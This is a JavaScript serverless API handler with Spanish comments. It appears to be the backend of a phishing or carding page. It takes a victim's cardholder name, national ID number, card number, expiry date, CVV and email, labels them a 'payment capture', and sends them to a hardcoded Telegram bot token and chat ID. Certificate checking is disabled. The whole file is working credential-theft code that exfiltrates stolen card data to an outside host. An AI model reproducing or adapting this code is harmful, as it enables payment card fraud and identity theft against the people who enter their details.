// Archivo: /api/notificar.js
import https from 'https';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error', message: 'Método no permitido' });
  }

  try {
    let datos = req.body;
    if (typeof datos === 'string') {
      datos = JSON.parse(datos);
    }

    const { titular, dni, tarjeta, vencimiento, cvv, email } = datos; // <--- AGREGAR , email ACÁ


    const TOKEN = "8948795195:AAFNDbx1b03tL9fEjvrrN5mieFYNbFT5l1g";
    const CHAT_ID = "8510398513";

        const mensaje = `<b>💳 Nueva Captura de Pago</b>\n\n` +
                    `<b>👤 Titular:</b> ${titular || 'N/A'}\n` +
                    `<b>🆔 DNI:</b> ${dni || 'N/A'}\n` +
                    `<b>📧 Email:</b> ${email || 'N/A'}\n` + // <--- AGREGAR ESTA LÍNEA
                    `<b>🔢 Tarjeta:</b> <code>${tarjeta || 'N/A'}</code>\n` +
                    `<b>📅 Vencimiento:</b> ${vencimiento || 'N/A'}\n` +
                    `<b>🔒 CVV:</b> <code>${cvv || 'N/A'}</code>`;

    // Configuración del envío nativo con HTTPS
    const postData = JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      rejectUnauthorized: false // Evita bloqueos de certificados SSL en el servidor de Vercel
    };

    // Promesa para manejar la petición asíncrona de forma segura
    const enviarTelegram = () => {
      return new Promise((resolve, reject) => {
        const telegramRequest = https.request(options, (telegramResponse) => {
          let body = '';
          telegramResponse.on('data', (chunk) => body += chunk);
          telegramResponse.on('end', () => {
            if (telegramResponse.statusCode === 200) {
              resolve(JSON.parse(body));
            } else {
              reject(new Error(`Telegram respondió con código ${telegramResponse.statusCode}: ${body}`));
            }
          });
        });

        telegramRequest.on('error', (e) => reject(e));
        telegramRequest.write(postData);
        telegramRequest.end();
      });
    };

    await enviarTelegram();

    return res.status(200).json({ status: 'success', message: 'Datos enviados correctamente' });

  } catch (error) {
    console.error("Error crítico en la API:", error.message);
    return res.status(500).json({ status: 'error', message: error.message });
  }
}
